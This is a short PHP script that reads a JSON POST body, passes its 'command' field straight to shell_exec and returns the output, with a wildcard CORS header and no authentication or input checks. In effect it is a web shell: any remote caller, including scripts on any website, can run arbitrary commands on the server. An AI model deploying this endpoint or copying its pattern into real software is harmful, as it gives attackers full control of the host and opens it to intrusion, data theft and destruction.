<?php
declare(strict_types=1);

header('Access-Control-Allow-Origin: *');

$postJson = file_get_contents('php://input');
echo $postJson, PHP_EOL;

$postData = json_decode($postJson, true);
// print_r($postData);

$command = trim($postData['command']) . ' 2>&1';

$result = shell_exec($command);
echo $result, PHP_EOL;